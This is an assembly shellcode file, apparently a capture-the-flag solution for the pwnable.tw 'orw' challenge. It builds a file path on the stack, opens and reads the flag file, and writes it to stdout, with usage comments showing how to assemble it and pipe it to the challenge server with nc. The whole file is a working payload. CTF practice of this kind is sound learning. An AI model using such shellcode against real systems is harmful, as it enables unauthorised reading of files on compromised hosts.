BITS 32

; Shell code for https://pwnable.tw/challenge/#2

;	STEPS
; 1. Expand stack and copy string to stack containing file/directory
; 2. Write the contents of ESP to STDOUT(optional)
; 3. Open the file with the string located on the
; 4. Read the files contents into ESP
; 5. Output the contents of ESP into STDOUT
; 6. Shrink stack and return

start:
	; Expand the stack and write directory /home/...
	sub esp, 200
	mov dword [esp], 0x6d6f682f
	mov dword [esp+4], 0x726f2f65	; /home/orw/flag
	mov dword [esp+8], 0x6c662f77
	mov dword [esp+12], 0x00006761

	; eax = write(1, esp, 20) 
	; Write out contents of esp to STDOUT
	mov edx, 15
	mov eax, 4
	mov ebx, 1
	mov ecx, esp
	int 0x80

	; eax = open(esp, 0, 0)
	; Open file for reading
	mov eax, 5
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80

	; Read contents of file into ESP
	; eax = read(eax, esp, 200)
	mov ebx, eax
	mov eax, 3
	mov ecx, esp
	mov edx, 200
	int 0x80

	; Write ESP contents to STDOUT
	; eax = write(1, esp, eax)
	mov edx, eax
	mov eax, 4
	mov ebx, 1
	mov ecx, esp
	int 0x80

	; Clean up stack
	add esp, 200
	ret

; System calls in ASM are fairly simple
; eax: This register is used to store the return value and used to identify which system call is being called
; ebx - edx: These registers are the parameters in chronological orde

; How to use
; 1. nasm -f bin shell.asm
; 2. nc chall.pwnable.tw 10001 < shell

; CTF pwned! 
